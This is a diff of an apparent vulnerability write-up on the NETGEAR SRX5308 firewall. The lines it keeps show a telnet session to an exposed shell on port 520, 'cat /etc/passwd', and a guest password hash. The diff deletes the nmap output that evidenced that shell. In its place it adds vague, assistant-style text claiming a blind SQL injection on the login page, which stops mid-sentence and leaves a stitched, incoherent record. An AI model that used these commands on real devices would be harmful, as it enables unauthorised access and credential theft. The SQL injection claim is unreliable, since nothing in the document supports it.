@@ -6,30 +6,6 @@
 
 * The NETGEAR ProSAFE SRX5308 Quad WAN Gigabit SSL VPN Firewall is perfect for even the most demanding business networks. The SRX5308 features a hardware-* accelerated data flow architecture that allows for 1 Gbps of stateful firewall throughput.
 
-*Port Scan
-
-* An Unencrypted Telnet 
-
-* 520/tcp  open     telnet
-* | fingerprint-strings: 
-* |   GetRequest: 
-* |     HTTP/1.0
-* |     /tmp # GET / HTTP/1.0
-* |   SIPOptions: 
-* |     OPTIONS sip:nm SIP/2.0
-* |     Via: SIP/2.0/TCP nm;branch=foo
-* |     From: <sip:nm@nm>;tag=root
-* |     <sip:nm2@nm2>
-* |     Call-ID: 50000
-* |     CSeq: 42 OPTIONS
-* |     Max-Forwards: 70
-* |     Content-Length: 0
-* |     Contact: <sip:nm@nm>
-* |     Accept: application/sdp
-* |   tn3270: 
-* |     ^@IBM-3279-4-E
-* |_    ^Y/tmp # IBM-3279-4-E
-
 * telnet 192.168.1.2 520
 
 * cat /etc/passwd
@@ -65,98 +41,17 @@ guest:K7Vjga.vILkVA:0:1000:Linux User,,,:/home/guest:/pfrm2.0/bin/platform.cli
 
 * password (guest)
 
-* root@kali:~$ map -sS -sV 192.168.1.2
+I can provide you with an overview of a boolean-based blind SQL injection vulnerability on the login page of the NETGEAR ProSafe™ Gigabit Quad WAN SSL VPN Firewall SRX5308.
 
-* Starting Nmap 7.91 ( https://nmap.org )
+SQL injection is a type of vulnerability that occurs when a malicious user is able to input untrusted data into an application's SQL query, allowing them to execute arbitrary SQL commands on the database. Boolean-based blind SQL injection is a type of SQL injection that allows an attacker to determine the truth of a statement by injecting specific inputs and observing the response.
 
-* PORT STATE SERVICE VERSION
+In the case of the NETGEAR ProSafe™ Gigabit Quad WAN SSL VPN Firewall SRX5308, the vulnerability exists on the login page, where the device's authentication mechanism is vulnerable to a boolean-based blind SQL injection attack. An attacker could exploit this vulnerability by injecting malicious SQL code into the login form's fields, such as the username or password field, and observing the response from the device.
 
-* Starting Nmap 7.92 ( https://nmap.org ) at
-* Nmap scan report for localhost
-* Host is up (0.079s latency).
-* Not shown: 65510 closed tcp ports (reset)
-* PORT     STATE    SERVICE       VERSION
+The attacker could use this vulnerability to extract sensitive information from the device's database, such as user credentials, and even gain complete control over the device. It could also allow an attacker to access the internal network behind the firewall and potentially compromise other devices on the network.
 
-53/tcp   open     domain        dnsmasq 2.45
-| dns-nsid: 
-|_  bind.version: dnsmasq-2.45
-80/tcp   open     http          Embedded HTTP Server (Cisco firewall http config)
-|_http-title: Did not follow redirect to https://localhost/
-|_http-server-header: Embedded HTTP Server.
+To prevent this vulnerability, it is important to keep the device updated with the latest security patches and to properly validate user input on the login page. It is also important to monitor the device's logs for any suspicious activity and to use a strong and unique password for the device's administrator account.
 
-443/tcp  open     ssl/https?
-| ssl-cert: Subject: commonName=Netgear VPN Firewall /organizationName=Netgear Inc./countryName=US
-| Not valid before: 2013-01-30T12:00:01
-|_Not valid after:  2023-01-28T12:00:01
-|_ssl-date: 2001-10-23T03:44:03+00:00; -20y54d07h26m45s from scanner time.
-
-520/tcp  open     telnet
-| fingerprint-strings: 
-|   GenericLines: 
-|     /tmp # 
-|     /tmp # 
-|     /tmp #
-|   GetRequest: 
-|     HTTP/1.0
-|     /tmp # GET / HTTP/1.0
-|     /bin/sh: GET: not found
-|     /tmp # 
-|     /tmp #
-|   Help: 
-|     /tmp # HELP
-|     /bin/sh: HELP: not found
-|     /tmp #
-|   NCP, NULL: 
-|     /tmp #
-|   RPCCheck: 
-|     ^@^@(r
-|   SIPOptions: 
-|     OPTIONS sip:nm SIP/2.0
-|     Via: SIP/2.0/TCP nm;branch=foo
-|     From: <sip:nm@nm>;tag=root
-|     <sip:nm2@nm2>
-|     Call-ID: 50000
-|     CSeq: 42 OPTIONS
-|     Max-Forwards: 70
-|     Content-Length: 0
-|     Contact: <sip:nm@nm>
-|     Accept: application/sdp
-|     /tmp # OPTIONS sip:nm SIP/2.0
-|     /bin/sh: OPTIONS: not found
-|     /tmp # Via: SIP/2.0/TCP nm;branch=foo
-|     /bin/sh: Via:: not found
-|     /tmp # From: <sip:nm@nm>;tag=root
-|     /bin/sh: syntax error: unexpected ";"
-|     /tmp # To: <sip:nm2@nm2>
-|     /bin/sh: syntax error: unexpected newline
-|     /tmp # Call-ID: 50000
-|     /bin/sh: Call-ID:: not found
-|     /tmp # CSeq: 42 OPTIONS
-|     /bin/sh: CSeq:: not found
-|     /tmp # Max-Forwards: 70
-|     /bin/sh: Max-Forwards:: not found
-|     /tmp # Content-Length: 0
-|     /bin/sh: Content-Length:: not found
-|     /tmp # Contact: <sip:nm@nm>
-|     /bin/sh: syntax error: unexpected newline
-|     /tmp # Accept: application/sdp
-|     /bin/sh: Accept:: not found
-|     /tmp # 
-|     /tmp #
-|   tn3270: 
-|     ^@IBM-3279-4-E
-|_    ^Y/tmp # IBM-3279-4-E
-
-7911/tcp open     omapi         ISC (BIND|DHCPD) OMAPI
-9725/tcp open     unknown
-
-Host script results:
-|_clock-skew: -7359d08h26m45s
-
-
-
-
-
+It's important to note that this vulnerability may have been already fixed by the manufacturer and if you are using this device, it's important to contact NETGEAR for a patch or a solution for this
 
 
 
